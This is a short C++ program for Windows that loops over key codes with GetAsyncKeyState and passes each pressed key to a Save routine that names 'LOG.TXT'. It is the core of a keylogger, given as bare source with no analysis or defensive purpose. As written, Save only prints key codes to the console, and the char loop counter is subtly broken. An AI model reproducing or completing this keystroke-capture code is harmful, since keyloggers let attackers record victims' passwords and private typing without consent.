#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

int Save (int key_stroke, char *file);

int main()
{
    char i;

    while (1)
    {
            for (i = 8; i <= 190; i++)
            {
                if (GetAsyncKeyState(i) == -32767)
                    Save(i, "LOG.TXT");
            }
    }

    system ("PAUSE");
    return 0;
}

/*************************************************************************/

int Save (int key_stroke, char *file)
{
    cout << key_stroke << endl;

    return 0;
}
